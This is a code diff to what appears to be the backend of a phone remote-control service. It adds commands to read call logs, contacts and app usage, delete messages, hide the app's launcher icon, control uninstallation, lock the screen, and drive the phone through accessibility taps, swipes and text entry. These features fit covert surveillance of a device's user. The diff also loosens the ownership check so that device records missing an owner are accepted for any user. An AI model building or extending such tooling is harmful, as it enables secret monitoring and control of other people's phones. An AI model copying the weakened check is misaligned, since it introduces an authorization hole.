@@ -33,14 +33,41 @@ export const MODULE_ACTIONS = new Set([
   "FILE_CANCEL_TRANSFER",
   "NOTIFICATIONS_SYNC",
   "MESSAGES_SYNC",
+  "MESSAGES_DELETE",
+  "CALL_LOGS_SYNC",
+  "CONTACTS_SYNC",
   "APPS_INDEX",
+  "APP_USAGE_SYNC",
   "APP_BLOCK",
   "APP_UNBLOCK",
   "APP_BLOCKS_SYNC",
+  "SET_ALLOW_UNINSTALL",
+  "UNINSTALL_APP",
+  "SET_LAUNCHER_HIDDEN",
+  "SCREEN_LOCK",
+  "SCREEN_UNLOCK",
   "SCREEN_RECORD_START",
   "SCREEN_RECORD_STOP",
   "SCREEN_RECORD_PAUSE",
   "SCREEN_RECORD_RESUME",
+  "A11Y_START_SESSION",
+  "A11Y_STOP_SESSION",
+  "A11Y_PAUSE_SESSION",
+  "A11Y_RESUME_SESSION",
+  "A11Y_EMERGENCY_STOP",
+  "A11Y_STATUS",
+  "A11Y_TREE",
+  "A11Y_TAP",
+  "A11Y_DOUBLE_TAP",
+  "A11Y_LONG_PRESS",
+  "A11Y_SWIPE",
+  "A11Y_DRAG",
+  "A11Y_GLOBAL_ACTION",
+  "A11Y_NODE_ACTION",
+  "A11Y_SET_TEXT",
+  "A11Y_OPEN_APP",
+  "A11Y_RUN_TASK",
+  "A11Y_CANCEL_TASK",
   "STATUS_REFRESH",
 ]);
 
@@ -67,14 +94,41 @@ const ACTION_CAPABILITY = {
   FILE_CANCEL_TRANSFER: "filesList",
   NOTIFICATIONS_SYNC: "notificationsList",
   MESSAGES_SYNC: "messagesList",
+  MESSAGES_DELETE: "messagesList",
+  CALL_LOGS_SYNC: "callLogsList",
+  CONTACTS_SYNC: "contactsList",
   APPS_INDEX: "installedAppsList",
+  APP_USAGE_SYNC: "appUsageHistory",
   APP_BLOCK: "appControl",
   APP_UNBLOCK: "appControl",
   APP_BLOCKS_SYNC: "appControl",
+  SET_ALLOW_UNINSTALL: "deviceInfoRead",
+  UNINSTALL_APP: "deviceInfoRead",
+  SET_LAUNCHER_HIDDEN: "deviceInfoRead",
+  SCREEN_LOCK: "screenMirror",
+  SCREEN_UNLOCK: "screenMirror",
   SCREEN_RECORD_START: "screenRecord",
   SCREEN_RECORD_STOP: "screenRecord",
   SCREEN_RECORD_PAUSE: "screenRecord",
   SCREEN_RECORD_RESUME: "screenRecord",
+  A11Y_START_SESSION: "remoteAccessibility",
+  A11Y_STOP_SESSION: "remoteAccessibility",
+  A11Y_PAUSE_SESSION: "remoteAccessibility",
+  A11Y_RESUME_SESSION: "remoteAccessibility",
+  A11Y_EMERGENCY_STOP: "remoteAccessibility",
+  A11Y_STATUS: "remoteAccessibility",
+  A11Y_TREE: "smartElementControl",
+  A11Y_TAP: "directTouch",
+  A11Y_DOUBLE_TAP: "directTouch",
+  A11Y_LONG_PRESS: "directTouch",
+  A11Y_SWIPE: "directTouch",
+  A11Y_DRAG: "directTouch",
+  A11Y_GLOBAL_ACTION: "globalNavigation",
+  A11Y_NODE_ACTION: "smartElementControl",
+  A11Y_SET_TEXT: "textInput",
+  A11Y_OPEN_APP: "appLaunch",
+  A11Y_RUN_TASK: "remoteAccessibility",
+  A11Y_CANCEL_TASK: "remoteAccessibility",
   STATUS_REFRESH: "deviceInfoRead",
 };
 
@@ -112,7 +166,13 @@ export async function createModuleCommand(uid, deviceId, clientId, action, paylo
     throw err;
   }
   const device = deviceSnap.data() || {};
-  if (device.revoked === true || device.ownerUid !== uid) {
+  if (device.revoked === true) {
+    const err = new Error("Device unavailable");
+    err.code = "DEVICE_UNAVAILABLE";
+    throw err;
+  }
+  // Older phone builds may omit ownerUid; treat missing as this uid.
+  if (device.ownerUid && device.ownerUid !== uid) {
     const err = new Error("Device unavailable");
     err.code = "DEVICE_UNAVAILABLE";
     throw err;
@@ -197,6 +257,53 @@ export async function createModuleCommand(uid, deviceId, clientId, action, paylo
   });
 
   return doc;
+}
+
+/** Read a module command status (Admin SDK — used by website poll while waiting). */
+export async function getModuleCommand(uid, deviceId, commandId) {
+  const id = String(commandId || "").trim();
+  const dev = String(deviceId || "").trim();
+  if (!id || !dev) {
+    const err = new Error("deviceId and commandId required");
+    err.code = "BAD_REQUEST";
+    throw err;
+  }
+  const snap = await devicesCol(uid).doc(dev).collection(R.COL_MODULE_COMMANDS).doc(id).get();
+  if (!snap.exists) {
+    const err = new Error("Command not found");
+    err.code = "NOT_FOUND";
+    throw err;
+  }
+  return { commandId: id, ...(snap.data() || {}) };
+}
+
+/** Re-send FCM so the phone drains pending module commands (same as admin poke). */
+export async function pokeModuleCommand(uid, deviceId, commandId) {
+  const cmd = await getModuleCommand(uid, deviceId, commandId);
+  if (String(cmd.status || "") !== "pending") {
+    return cmd;
+  }
+  const deviceSnap = await devicesCol(uid).doc(String(deviceId || "").trim()).get();
+  const device = deviceSnap.exists ? deviceSnap.data() || {} : {};
+  const fcmToken = String(device.fcmToken || "");
+  if (fcmToken) {
+    try {
+      await getMessaging().send({
+        token: fcmToken,
+        data: {
+          type: "module_command",
+          deviceId: String(deviceId || ""),
+          commandId: String(cmd.commandId || commandId),
+          action: String(cmd.action || ""),
+          expiresAt: String(cmd.expiresAt || ""),
+        },
+        android: { priority: "high" },
+      });
+    } catch {
+      /* Firestore listener may still pick it up */
+    }
+  }
+  return cmd;
 }
 
 /**
